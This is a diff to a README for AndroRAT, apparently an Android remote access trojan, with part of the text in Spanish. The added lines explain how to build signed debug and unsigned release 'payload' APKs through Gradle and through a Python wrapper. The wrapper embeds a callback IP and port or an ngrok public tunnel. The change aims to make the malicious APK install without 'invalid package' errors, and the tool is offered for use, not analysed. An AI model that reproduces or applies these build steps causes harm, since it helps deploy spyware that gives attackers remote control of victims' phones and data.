@@ -67,16 +67,41 @@ pip install -r requirements.txt
 
 ### Compilar APK
 
+There are two build variants:
+
+* **debug** – signed with the default Android debug key (installs on any device).
+* **release** – unsigned unless you configure a signing config; may be rejected by installer.
+
+By default the GitHub Actions pipeline now builds both and prefers the debug APK for download.
+
+Local commands:
+
 ```bash
-# Con IP y puerto local
+# debug build (guaranteed to install)
+cd Android_Code
+./gradlew assembleDebug
+cp app/build/outputs/apk/debug/app-debug.apk ../payload-debug.apk
+
+# release build (unsigned, needs signing to install)
+cd Android_Code
+./gradlew assembleRelease
+cp app/build/outputs/apk/release/app-release.apk ../payload-release.apk
+```
+
+You can also use the Python helper; it will build debug when requested:
+
+```bash
+# Python wrapper builds both; output is debug by default
 python3 androRAT.py --build -i 192.168.1.100 -p 4444 -o payload.apk
 
-# Con ngrok (túnel público)
+# with ngrok
 python3 androRAT.py --build --ngrok -p 8000 -o payload.apk
 
-# Con icono visible
+# add icon
 python3 androRAT.py --build -i 192.168.1.100 -p 4444 -o payload.apk -icon
 ```
+
+The debug variant (`payload-debug.apk` or the artifact from Actions) will install 100% without the "invalid package" error, because it is automatically signed.
 
 ### Iniciar Listener
 
